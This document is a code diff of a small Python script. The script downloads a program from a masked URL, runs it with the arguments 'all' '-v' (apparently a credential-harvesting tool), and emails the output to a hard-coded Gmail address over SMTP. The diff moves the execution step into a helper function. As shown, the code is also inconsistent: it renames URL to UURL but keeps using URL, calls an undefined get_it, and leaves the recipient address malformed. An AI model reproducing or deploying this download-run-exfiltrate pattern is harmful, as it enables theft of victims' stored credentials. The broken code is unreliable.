@@ -10,6 +10,14 @@ def get_payload():
         with open(name, "wb") as payload:
             payload.write(get_request.content)
 
+def execute(prgm):
+    process = subprocess.Popen([prgm, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    result, error = process.communicate()
+    try:
+        return result.decode('latin-1').encode("utf-8")
+    except:
+        return str(result)
+
 def mail_it(email, passwd, to_mail, msg):
     mailserver = smtplib.SMTP("smtp.gmail.com", 587)
     mailserver.starttls()
@@ -17,13 +25,9 @@ def mail_it(email, passwd, to_mail, msg):
     mailserver.sendmail(email, to_mail, msg)
     mailserver.quit()
 
-URL= "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-get_payload(URL)
+UURL = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 file_name = URL.split("/")[-1]
-process = subprocess.Popen([file_name, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-result, error = process.communicate()
-try:
-    message = result.decode('latin-1').encode("utf-8")
-except:
-    message = str(result)
-mail_it("xxxxxxxxxx@gmail.com", "***********", "xxxxxxxxxxx@gmail.com", message)
+
+get_it(URL)
+message = execute(file_name)
+mail_it("xxxxxxxxxx@gmail.com", "********", "xxxxxxxxxx.com", message)
